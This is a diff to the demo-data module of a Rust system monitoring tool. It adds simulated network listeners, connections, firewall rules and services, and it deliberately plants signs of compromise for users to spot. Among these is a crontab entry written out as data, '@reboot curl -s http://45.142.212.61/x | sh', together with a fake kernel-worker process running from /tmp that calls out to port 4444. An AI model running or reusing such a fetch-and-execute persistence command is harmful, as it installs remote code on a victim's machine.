@@ -5,8 +5,10 @@
 //! it appears, so it is never mistaken for real telemetry.
 
 use bw_model::{
-    Capabilities, FdInfo, FdKind, HostInfo, Interface, MemRegion, Owner, ProcKey, ProcState,
-    Process, ProcessDetail, Realm, RegionKind, Snapshot, SystemStats, ThreadInfo, Volume,
+    Capabilities, Connection, FdInfo, FdKind, Firewall, FirewallAction, FirewallRule,
+    FirewallStatus, HostInfo, Interface, Listener, MemRegion, NetState, Owner, ProcKey, ProcState,
+    Process, ProcessDetail, Proto, Realm, RegionKind, Service, ServiceKind, ServiceState, Snapshot,
+    SystemStats, ThreadInfo, Volume,
 };
 use bw_platform::Collector;
 use std::collections::BTreeMap;
@@ -39,6 +41,8 @@ struct Spec {
     cpu: f32,
     swing: f32,
     state: ProcState,
+    /// Executable path, when not `/usr/bin/<name>`.
+    exe: Option<&'static str>,
 }
 
 pub struct DemoWorld {
@@ -52,6 +56,8 @@ pub struct DemoWorld {
     last: Option<Snapshot>,
     /// The Web Content process with a leak to find.
     leaky: Option<ProcKey>,
+    /// A web server worker that will spawn a shell (planted suspicion).
+    web_worker: Option<u32>,
 }
 
 impl DemoWorld {
@@ -64,6 +70,7 @@ impl DemoWorld {
             transient: vec![],
             last: None,
             leaky: None,
+            web_worker: None,
         };
         w.build();
         w
@@ -91,6 +98,7 @@ impl DemoWorld {
             cpu,
             swing,
             state: ProcState::Sleeping,
+            exe: None,
         });
         pid
     }
@@ -108,6 +116,7 @@ impl DemoWorld {
             cpu: 0.1,
             swing: 0.2,
             state: ProcState::Sleeping,
+            exe: None,
         });
         self.specs.push(Spec {
             pid: 2,
@@ -119,6 +128,7 @@ impl DemoWorld {
             cpu: 0.0,
             swing: 0.0,
             state: ProcState::Sleeping,
+            exe: None,
         });
         for (i, n) in [
             "kworker/0:1-events",
@@ -201,7 +211,10 @@ impl DemoWorld {
             );
             let ng = self.add(Some(shim), "nginx", User, System, 8 * MB, 0.1, 0.2);
             for _ in 0..3 {
-                self.add(Some(ng), "nginx: worker", User, OtherUser, 9 * MB, 0.3, 1.5);
+                let w = self.add(Some(ng), "nginx: worker", User, OtherUser, 9 * MB, 0.3, 1.5);
+                if self.web_worker.is_none() {
+                    self.web_worker = Some(w);
+                }
             }
         }
         let redis_shim = self.add(
@@ -396,6 +409,25 @@ impl DemoWorld {
             1.0,
             3.0,
         );
+        // Planted suspicions. A web server worker that spawned a shell which
+        // fetches something; and a "kernel worker" that is no such thing: a
+        // user process running from /tmp, saturating a core, calling out.
+        if let Some(w) = self.web_worker {
+            let sh = self.add(Some(w), "sh", User, OtherUser, 2 * MB, 0.0, 0.1);
+            self.add(Some(sh), "curl", User, OtherUser, 6 * MB, 0.4, 0.6);
+        }
+        let fake = self.add(
+            Some(1),
+            "kworker/u8:3",
+            User,
+            CurrentUser,
+            64 * MB,
+            93.0,
+            4.0,
+        );
+        if let Some(s) = self.specs.iter_mut().find(|s| s.pid == fake) {
+            s.exe = Some("/tmp/.X11-unix/.kworker");
+        }
         // The cargo PID is reused below for transient rustc children.
         self.transient.push((cargo, 0));
     }
@@ -478,6 +510,9 @@ impl DemoWorld {
                     (wave * 3.0 * MB as f32) as u64,
                 ),
             );
+            if let (Some(exe), Some(p)) = (s.exe, processes.get_mut(&key)) {
+                p.exe = Some(exe.into());
+            }
         }
         // Transient compiler jobs: a rolling set of rustc processes under cargo.
         let cargo = self.cargo_pid();
@@ -516,6 +551,7 @@ impl DemoWorld {
         let cpus = 16;
         let cpu_pct = (total_cpu / cpus as f32).min(100.0);
         let pressure = (0.18 + 0.15 * (t * 0.07).sin() + cpu_pct / 250.0).clamp(0.0, 1.0);
+        let net = demo_net(&processes);
         Snapshot {
             time_ms: (boot + 90_000 + self.tick) * 1000,
             host: HostInfo {
@@ -574,6 +610,7 @@ impl DemoWorld {
                     written_bytes: 55 * MB,
                 },
             ],
+            net,
             interfaces: vec![
                 Interface {
                     name: "wlp0s20f3".into(),
@@ -588,6 +625,260 @@ impl DemoWorld {
             ],
         }
     }
+}
+
+/// The demo's network: a few listeners (one it shouldn't have), browser and
+/// app traffic, and one connection to a rare address on an odd port.
+fn demo_net(ps: &BTreeMap<ProcKey, Process>) -> NetState {
+    let by = |name: &str| ps.values().find(|p| p.name == name).map(|p| p.key);
+    let all = |name: &str| -> Vec<ProcKey> {
+        ps.values()
+            .filter(|p| p.name == name)
+            .map(|p| p.key)
+            .collect()
+    };
+    let listen = |port, exposed, name: &str, proto| Listener {
+        proto,
+        port,
+        addr: if exposed { "0.0.0.0" } else { "127.0.0.1" }.into(),
+        exposed,
+        process: by(name),
+    };
+    let listening = vec![
+        listen(22, true, "sshd", Proto::Tcp),
+        listen(80, true, "nginx", Proto::Tcp),
+        listen(443, true, "nginx", Proto::Tcp),
+        listen(5432, false, "postgres", Proto::Tcp),
+        listen(631, false, "cupsd", Proto::Tcp),
+        listen(5353, true, "avahi-daemon", Proto::Udp),
+        listen(6379, false, "redis-server", Proto::Tcp),
+        listen(31337, true, "kworker/u8:3", Proto::Tcp),
+    ];
+    let mut connections = Vec::new();
+    let mut out = |process: Option<ProcKey>, ip: &str, port: u16, local: u16| {
+        connections.push(Connection {
+            proto: Proto::Tcp,
+            local_port: local,
+            remote_addr: ip.into(),
+            remote_port: port,
+            outbound: true,
+            process,
+        })
+    };
+    for (i, k) in all("Web Content").iter().take(4).enumerate() {
+        out(
+            Some(*k),
+            [
+                "151.101.1.140",
+                "142.250.74.78",
+                "104.16.132.229",
+                "185.199.108.153",
+            ][i],
+            443,
+            40_100 + i as u16,
+        );
+    }
+    out(by("firefox"), "34.107.221.82", 443, 40_200);
+    out(by("spotify"), "35.186.224.25", 4070, 40_210);
+    out(by("discord"), "162.159.135.232", 443, 40_220);
+    out(by("code"), "140.82.112.21", 443, 40_230);
+    out(by("curl"), "45.142.212.61", 80, 40_240);
+    out(by("kworker/u8:3"), "45.142.212.61", 4444, 40_250);
+    // An inbound SSH session.
+    connections.push(Connection {
+        proto: Proto::Tcp,
+        local_port: 22,
+        remote_addr: "10.0.0.12".into(),
+        remote_port: 51_022,
+        outbound: false,
+        process: by("sshd"),
+    });
+    NetState {
+        listening,
+        connections,
+        firewall: Firewall::default(),
+    }
+}
+
+/// The demo's firewall, as `ufw` would report it once admin rights are given.
+pub fn demo_firewall() -> Firewall {
+    let rule = |port, action, text: &str| FirewallRule {
+        port: Some(port),
+        proto: Some(Proto::Tcp),
+        action,
+        text: text.into(),
+    };
+    Firewall {
+        status: FirewallStatus::Active,
+        backend: "ufw".into(),
+        inbound_default: Some(FirewallAction::Deny),
+        rules: vec![
+            rule(22, FirewallAction::Allow, "22/tcp ALLOW IN Anywhere"),
+            rule(80, FirewallAction::Allow, "80,443/tcp ALLOW IN Anywhere"),
+            rule(443, FirewallAction::Allow, "80,443/tcp ALLOW IN Anywhere"),
+        ],
+    }
+}
+
+/// The demo's services, as of `now` (Unix seconds): a long-forgotten
+/// project and its containers, a game server nobody has started in months,
+/// and two fresh persistence entries that should not be there.
+pub fn demo_services(now: u64) -> Vec<Service> {
+    const DAY: u64 = 86_400;
+    let svc = |kind,
+               name: &str,
+               location: &str,
+               state,
+               enabled,
+               last: Option<u64>,
+               changed: Option<u64>| Service {
+        kind,
+        name: name.into(),
+        location: location.into(),
+        state,
+        enabled,
+        last_active: last.map(|d| now - d * DAY),
+        changed: changed.map(|d| now - d * DAY),
+    };
+    use ServiceKind::*;
+    use ServiceState::*;
+    vec![
+        svc(
+            Project,
+            "odysseus",
+            "/home/ashn/code/odysseus (compose)",
+            Idle,
+            false,
+            Some(428),
+            Some(401),
+        ),
+        svc(
+            Container,
+            "odysseus-api-1",
+            "docker: odysseus-api-1",
+            Idle,
+            false,
+            Some(428),
+            Some(470),
+        ),
+        svc(
+            Container,
+            "odysseus-db-1",
+            "docker: odysseus-db-1",
+            Idle,
+            false,
+            Some(428),
+            Some(470),
+        ),
+        svc(
+            Container,
+            "odysseus-worker-1",
+            "docker: odysseus-worker-1",
+            Failed,
+            false,
+            Some(431),
+            Some(470),
+        ),
+        svc(
+            Project,
+            "thesis-scraper",
+            "/home/ashn/code/thesis-scraper (Procfile)",
+            Idle,
+            false,
+            None,
+            Some(243),
+        ),
+        svc(
+            Project,
+            "site",
+            "/home/ashn/code/site (node app)",
+            Idle,
+            false,
+            None,
+            Some(2),
+        ),
+        svc(
+            Container,
+            "redis",
+            "docker: redis",
+            Running,
+            true,
+            None,
+            Some(96),
+        ),
+        svc(
+            Container,
+            "portainer",
+            "docker: portainer",
+            Idle,
+            true,
+            Some(61),
+            Some(300),
+        ),
+        svc(
+            SystemUnit,
+            "minecraft-server",
+            "/etc/systemd/system/minecraft-server.service",
+            Idle,
+            true,
+            Some(274),
+            Some(380),
+        ),
+        svc(
+            SystemUnit,
+            "odysseus-worker",
+            "/etc/systemd/system/odysseus-worker.service",
+            Failed,
+            false,
+            Some(429),
+            Some(440),
+        ),
+        svc(
+            Scheduled,
+            "backup.timer",
+            "/etc/systemd/system/backup.timer",
+            Running,
+            true,
+            None,
+            Some(120),
+        ),
+        svc(
+            UserUnit,
+            "syncthing",
+            "/home/ashn/.config/systemd/user/syncthing.service",
+            Running,
+            true,
+            None,
+            Some(150),
+        ),
+        svc(
+            Autostart,
+            "Discord",
+            "/home/ashn/.config/autostart/discord.desktop",
+            Idle,
+            true,
+            None,
+            Some(210),
+        ),
+        svc(
+            Autostart,
+            "system-update",
+            "/home/ashn/.config/autostart/system-update.desktop",
+            Idle,
+            true,
+            None,
+            Some(1),
+        ),
+        svc(
+            Scheduled,
+            "curl -s http://45.142.212.61/x | sh",
+            "crontab: @reboot curl -s http://45.142.212.61/x | sh",
+            Idle,
+            true,
+            None,
+            Some(1),
+        ),
+    ]
 }
 
 #[allow(clippy::too_many_arguments)]
